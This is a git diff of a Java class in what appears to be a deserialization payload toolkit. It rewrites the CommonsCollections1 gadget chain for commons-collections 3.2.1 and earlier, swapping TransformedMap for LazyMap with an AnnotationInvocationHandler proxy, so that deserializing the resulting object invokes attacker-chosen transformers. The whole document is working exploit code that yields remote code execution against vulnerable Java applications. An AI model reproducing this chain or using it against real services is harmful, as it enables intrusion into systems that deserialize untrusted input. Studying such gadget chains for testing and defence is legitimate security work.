@@ -1,4 +1,4 @@
-package com.ppp.chain.collections3;
+package com.ppp.chain.commonscollections3;
 
 import com.ppp.KickOff;
 import com.ppp.ObjectPayload;
@@ -12,9 +12,8 @@ import com.ppp.utils.Reflections;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.map.TransformedMap;
+import org.apache.commons.collections.map.LazyMap;
 
-import java.lang.annotation.Target;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -22,12 +21,12 @@ import java.util.Map;
  * @author Whoopsunix
  */
 @Dependencies({"commons-collections:commons-collections:<=3.2.1"})
-@Authors({Authors.MATTHIASKAISER})
+@Authors({Authors.FROHOFF})
 @Sink({Sink.InvokerTransformer3})
-public class CommonsCollections1E implements ObjectPayload<Object> {
+public class CommonsCollections1 implements ObjectPayload<Object> {
 
     public static void main(String[] args) throws Exception {
-        PayloadRunner.run(CommonsCollections1E.class, args);
+        PayloadRunner.run(CommonsCollections1.class, args);
     }
 
     public Object getObject(SinksHelper sinksHelper) throws Exception {
@@ -40,17 +39,18 @@ public class CommonsCollections1E implements ObjectPayload<Object> {
     }
 
     public Object getChain(Object transformers) throws Exception {
+        // chain
         final Transformer transformerChain = new ChainedTransformer(
                 new Transformer[]{new ConstantTransformer(1)});
 
-        HashMap map = new HashMap();
-        map.put("value", "value");
+        final Map innerMap = new HashMap();
 
-        Map<Object, Object> transMap = TransformedMap.decorate(map, null, transformerChain);
-//        Map<Object, Object> transMap = (Map<Object, Object>) Reflections.getFirstCtor("org.apache.commons.collections.map.TransformedMap").newInstance(map, null, transformerChain);
+        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
 
-        Object annotationInvocationHandler = KickOff.annotationInvocationHandler(transMap, Target.class);
-        // 即 ChainedTransformer 的 Transformer[]
+        final Map mapProxy = KickOff.createMemoitizedProxy(lazyMap, Map.class);
+
+        // kickoff
+        Object annotationInvocationHandler = KickOff.annotationInvocationHandler(mapProxy);
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
 
         return annotationInvocationHandler;
